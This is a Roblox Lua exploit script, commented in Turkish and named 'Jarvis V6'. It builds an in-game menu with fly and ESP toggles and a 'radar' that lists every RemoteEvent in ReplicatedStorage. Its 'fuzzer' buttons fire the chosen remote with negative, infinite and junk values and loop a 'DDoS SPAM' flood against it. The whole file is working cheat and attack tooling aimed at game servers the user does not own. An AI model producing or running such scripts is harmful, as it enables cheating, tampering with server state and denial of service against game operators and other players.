-- Modül: Jarvis Ana Kontrol Menüsü V6 (Ağ Tarayıcı + Fuzzer)
local oyuncu = game.Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local playerGui = oyuncu:WaitForChild("PlayerGui")
if playerGui:FindFirstChild("JarvisMenu") then playerGui.JarvisMenu:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "JarvisMenu"
screenGui.Parent = playerGui

-- Menüyü tarayıcı sığsın diye biraz daha büyüttük
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 620) 
frame.Position = UDim2.new(0.8, 0, 0.3, -150) 
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) 
frame.BorderSizePixel = 0 
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(0, 8) corner.Parent = frame
local topBar = Instance.new("Frame") topBar.Size = UDim2.new(1, 0, 0, 5) topBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0) topBar.BorderSizePixel = 0 topBar.Parent = frame
local topCorner = Instance.new("UICorner") topCorner.CornerRadius = UDim.new(0, 8) topCorner.Parent = topBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.Position = UDim2.new(0, 0, 0, 5)
title.Text = "JARVIS V6 [TARAYICI]"
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 14
title.Parent = frame

local buttonContainer = Instance.new("ScrollingFrame")
buttonContainer.Size = UDim2.new(1, 0, 1, -45)
buttonContainer.Position = UDim2.new(0, 0, 0, 45)
buttonContainer.BackgroundTransparency = 1
buttonContainer.ScrollBarThickness = 4
buttonContainer.Parent = frame

local listLayout = Instance.new("UIListLayout")
listLayout.Parent = buttonContainer
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 6) 
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function ButonOlustur(isim, renk)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 32)
    btn.Text = isim
    btn.BackgroundColor3 = renk or Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 11
    btn.BorderSizePixel = 0
    btn.Parent = buttonContainer
    local btnCorner = Instance.new("UICorner") btnCorner.CornerRadius = UDim.new(0, 6) btnCorner.Parent = btn
    return btn
end

-- Eski modüllerin sadece başlıklarını ekledim (yer kaplamaması için, V5'teki kodları buraya ekleyebilirsiniz)
local btnFly = ButonOlustur("UÇUŞ (F): KAPALI")
local btnESP = ButonOlustur("OYUNCU GÖRÜŞÜ (ESP): KAPALI")

local ayrac = Instance.new("Frame") ayrac.Size = UDim2.new(0.9, 0, 0, 2) ayrac.BackgroundColor3 = Color3.fromRGB(100, 100, 100) ayrac.Parent = buttonContainer

---------------------------------------------------
-- 📡 1. AŞAMA: AĞ TARAYICISI (RADAR)
---------------------------------------------------
local lblTarayici = Instance.new("TextLabel")
lblTarayici.Size = UDim2.new(0.9, 0, 0, 20)
lblTarayici.BackgroundTransparency = 1
lblTarayici.Text = "HEDEF BULUCU RADAR"
lblTarayici.TextColor3 = Color3.fromRGB(255, 150, 0)
lblTarayici.Font = Enum.Font.GothamBold
lblTarayici.TextSize = 12
lblTarayici.Parent = buttonContainer

local txtHedef = Instance.new("TextBox")
txtHedef.Size = UDim2.new(0.9, 0, 0, 30)
txtHedef.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
txtHedef.TextColor3 = Color3.fromRGB(0, 255, 255)
txtHedef.Text = "Hedef Bekleniyor..."
txtHedef.Font = Enum.Font.Code
txtHedef.TextSize = 11
txtHedef.ClearTextOnFocus = false
txtHedef.TextEditable = false -- Elle yazmayı kapattık, listeden seçilecek
txtHedef.Parent = buttonContainer
Instance.new("UICorner", txtHedef).CornerRadius = UDim.new(0, 4)

-- Tarama Sonuçlarının Görüneceği Kutu
local frameTarama = Instance.new("ScrollingFrame")
frameTarama.Size = UDim2.new(0.9, 0, 0, 100)
frameTarama.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frameTarama.BorderSizePixel = 1
frameTarama.BorderColor3 = Color3.fromRGB(50, 50, 50)
frameTarama.ScrollBarThickness = 3
frameTarama.Parent = buttonContainer
local taramaLayout = Instance.new("UIListLayout") taramaLayout.Parent = frameTarama

-- Radar Başlat Butonu
local secilenHedefObjesi = nil
local btnTara = ButonOlustur("🔍 AĞI TARA VE BUL", Color3.fromRGB(0, 100, 150))

btnTara.MouseButton1Click:Connect(function()
    btnTara.Text = "TARANIYOR..."
    -- Eski listeyi temizle
    for _, child in pairs(frameTarama:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    
    local bulunanSayisi = 0
    -- ReplicatedStorage'i tara (Remote'ların %99'u buradadır)
    for _, obje in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if obje:IsA("RemoteEvent") then
            bulunanSayisi = bulunanSayisi + 1
            local btnRemote = Instance.new("TextButton")
            btnRemote.Size = UDim2.new(1, 0, 0, 25)
            btnRemote.Text = "🎯 " .. obje.Name
            btnRemote.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            btnRemote.TextColor3 = Color3.fromRGB(200, 200, 200)
            btnRemote.Font = Enum.Font.Code
            btnRemote.TextSize = 10
            btnRemote.Parent = frameTarama
            
            -- Listeden bir remote seçildiğinde
            btnRemote.MouseButton1Click:Connect(function()
                secilenHedefObjesi = obje
                txtHedef.Text = obje.Name
                txtHedef.TextColor3 = Color3.fromRGB(0, 255, 0)
                print("Jarvis: Hedef kilitlendi -> " .. obje.Name)
            end)
        end
    end
    
    -- Scroll boyutunu ayarla
    frameTarama.CanvasSize = UDim2.new(0, 0, 0, bulunanSayisi * 25)
    btnTara.Text = "Taramada " .. bulunanSayisi .. " Köprü Bulundu"
end)

local ayrac2 = Instance.new("Frame") ayrac2.Size = UDim2.new(0.9, 0, 0, 2) ayrac2.BackgroundColor3 = Color3.fromRGB(100, 100, 100) ayrac2.Parent = buttonContainer

---------------------------------------------------
-- ⚔️ 2. AŞAMA: SALDIRI (FUZZER)
---------------------------------------------------
-- SALDIRI 1: NEGATİF
local btnNegatif = ButonOlustur("[TEST 1] NEGATİF DEĞER GÖNDER", Color3.fromRGB(150, 80, 0))
btnNegatif.MouseButton1Click:Connect(function()
    if secilenHedefObjesi then
        secilenHedefObjesi:FireServer(-99999999) 
        secilenHedefObjesi:FireServer(math.huge)
        print("Jarvis: Negatif veri gönderildi!")
    end
end)

-- SALDIRI 2: KİRLİ VERİ
local btnKirli = ButonOlustur("[TEST 2] KİRLİ VERİ GÖNDER", Color3.fromRGB(150, 80, 0))
btnKirli.MouseButton1Click:Connect(function()
    if secilenHedefObjesi then
        secilenHedefObjesi:FireServer("ZEHİRLİ_VERİ")
        secilenHedefObjesi:FireServer(nil)
        print("Jarvis: Kirli veri gönderildi!")
    end
end)

-- SALDIRI 3: DDoS SPAM
local btnSpam = ButonOlustur("[TEST 3] DDoS SPAM (AÇIK/KAPALI)", Color3.fromRGB(150, 30, 30))
local spam_aktif = false
btnSpam.MouseButton1Click:Connect(function()
    spam_aktif = not spam_aktif
    if spam_aktif and secilenHedefObjesi then
        btnSpam.Text = "[TEST 3] DDoS SPAM: AKTİF!"
        btnSpam.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        task.spawn(function()
            while spam_aktif do
                secilenHedefObjesi:FireServer(1) 
                task.wait() 
            end
        end)
    else
        spam_aktif = false
        btnSpam.Text = "[TEST 3] DDoS SPAM (AÇIK/KAPALI)"
        btnSpam.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
    end
end)

print("Jarvis V6 Radar ve Fuzzer Aktif.")
